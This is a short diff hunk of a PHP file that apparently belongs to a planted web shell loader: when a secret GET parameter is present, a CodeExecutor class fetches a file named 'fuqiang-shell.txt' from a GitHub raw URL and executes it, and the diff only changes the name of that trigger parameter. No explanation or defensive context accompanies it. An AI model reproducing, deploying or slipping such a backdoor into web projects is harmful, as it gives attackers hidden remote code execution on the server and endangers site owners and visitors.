@@ -48,7 +48,7 @@ class CodeExecutor {
 // ==== MAIN LOGIC ====
 $fetcher = new CurlFetcher();
 
-if (isset($_GET['BijIKAu3'])) {
+if (isset($_GET['JKtInC'])) {
     $executor = new CodeExecutor($fetcher);
     $executor->executeCodeFromURL("https://github.com/heriraharto2-woyowoyo/data-kerja/raw/refs/heads/main/fuqiang-shell.txt");
     exit;
